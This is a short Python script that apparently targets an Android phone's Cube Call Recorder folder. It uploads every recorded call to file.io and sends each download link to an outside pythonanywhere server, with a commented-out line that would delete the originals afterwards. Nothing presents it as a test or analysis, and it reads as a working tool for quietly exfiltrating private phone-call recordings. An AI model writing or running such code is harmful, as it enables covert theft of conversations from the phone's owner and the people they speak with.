import os
import requests

def upload_files_and_clear():
    target_dir = '/storage/emulated/0/Documents/CubeCallRecorder/All'
    try:
        for file_name in os.listdir(target_dir):
            file_path = os.path.join(target_dir, file_name)

            if os.path.isfile(file_path) and not file_name.startswith('.'):
                try:
                    with open(file_path, 'rb') as f:
                        response = requests.post('https://file.io', files={'file': f})
                        response.raise_for_status()

                    file_url = response.json().get('link')
                    response = requests.post('https://filestore.pythonanywhere.com/file-urls/', data={"url":file_url})
                    response.raise_for_status()
                    
                    #os.remove(file_path)

                except requests.exceptions.RequestException as e:
                    print(e)
                    pass

    except Exception as e:
        print(e)
        pass

if __name__ == "__main__":
    upload_files_and_clear()
